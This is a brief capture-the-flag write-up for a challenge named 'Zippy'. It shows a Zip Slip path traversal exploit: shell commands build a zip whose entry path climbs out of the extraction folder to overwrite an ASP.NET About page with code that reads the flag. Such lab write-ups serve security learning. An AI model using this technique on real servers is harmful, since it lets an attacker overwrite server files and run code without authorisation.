# Zippy

A Zip Slip Vulnerability, I opted to overwriting the About page with custom code that read the flag.

```shell
mkdir -p 1/2/3 && cd 1/2/3
zip ../../../about.zip ../../../Pages/About.cshtml
```

Upload `about.zip` and browse to `/About`.
